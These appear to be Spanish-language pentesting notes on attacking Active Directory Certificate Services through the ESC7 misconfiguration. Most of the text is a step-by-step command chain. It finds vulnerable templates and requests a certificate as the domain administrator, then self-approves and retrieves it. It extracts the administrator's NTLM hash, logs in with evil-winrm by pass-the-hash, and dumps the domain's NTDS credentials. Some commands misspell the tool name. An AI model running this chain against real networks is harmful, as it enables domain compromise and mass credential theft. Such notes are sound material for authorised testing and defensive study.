# ADCS Attacks 

Tags: #Windows #PrivEsc #ESC #Linux #ADCS #ESC7 

Es un servicio de infraestructura de clave pública de Microsoft
	- Emitir
	- Administrar
	- Publicar / Revocar certificados digitales 

Utilidades practicas:
	- Emitir certificados para autenticación en computadores / servidores
	- Acceder a redes Wifi EMpresariales (WPA - Enterprise)
	- Acceder a redes VPN

Componentes:
- CA (Autoridad Certificadora)
- Certificate Templates 
	- Quien emite el certificado
	- Duración 
	- Quien puede usarlo 
	- Los permisos 

# ESC 7 - Vulnerable Certificate Authority Access Control

**Requisitos:**
* Quién tiene el rol de Administrador de toda "la notaria"

**Roles:**
* Manage CA: Es el director de la notaria
* Manage Certificates: Es el oficial que revisa las **solicitudes de los certificados**
* Si un usuario tiene el rol de **Manage Certificates** puede aprobar sus propias solicitudes de certificados pendientes 

**Qué contiene la plantilla?**
* En **Issuance Requirements** tiene habilitado el "CA certificate manager approval"

## Enumeración General 

```bash 
# Buscar certificados vulnerables 
❯ certipy-ad find -u 'user' -p 'P@$$w0rd123!' -dc-ip IP_DC -vulnerable -stdout

Donde se obtiene:
	- CA Name 
	- Template Name  
	- Enrollment Rights -> (Quién puede solicitar el certificado directamente)
	- Enabled = FALSE   # Quiere decir que la plantilla no esta publicada 
	- ManageCertificates = Domain.corp\user
```
## ESC 7: Forma 1 

```bash 
Paso 1:
❯ certipy-ad find -u 'user' -p 'P@$$w0rd123!' -dc-ip IP_DC -stdout | grep -B 20 "Requires Manager Approval.*: True"
# Buscar la plantilla si no esta publicada pero que requiera la aprobación:
	Enrollee Supplies Subject: True 
	Requires Manager Approval: True 

Paso 2:
# Hacer la solicitud 
❯ certify-ad req -u 'user@Domain.corp' -p 'P@$$w0rd123!' -ca 'CA_Name' -template 'User' -upn 'administrator@Domain.corp' -dc-ip IP_DC -target Target_Server_Name

	# template = La plantilla que no esta publicada y que tiene la vulnerabilidad 

NOTA: 
	- Se obtiene el 'ID_Number' de la solicitud para despues aprobarla
```

```bash 
Paso 3:
# Aprobar la solicitud 
❯ certify-ad ca -u 'user@Domain.corp' -p 'P@$$w0rd123!' -ca 'CA_Name' -issue-request ID_Number -dc-ip IP_DC -target Target_Server_Name 

Paso 4:
# Solicitar el certificado 
❯ certify-ad req -u 'user@Domain.corp' -p 'P@$$w0rd123!' -ca 'CA_Name' -retrieve ID_Number -dc-ip IP_DC -target Target_Server_Name 
```

```bash 
Paso 5:
# Autenticarse usando el certificado obtenido un TGT para obtener el HASH NTLM
❯ certipy-ad auth -pfx administrator.pfx -dc-ip IP_DC

Paso 6:
# Conectarse al server como Administrator 
❯ evil-winrm -i IP_DC -u Administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff

# DCSync 
❯ nxc smb IP_DC -u Administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff --ntds 
```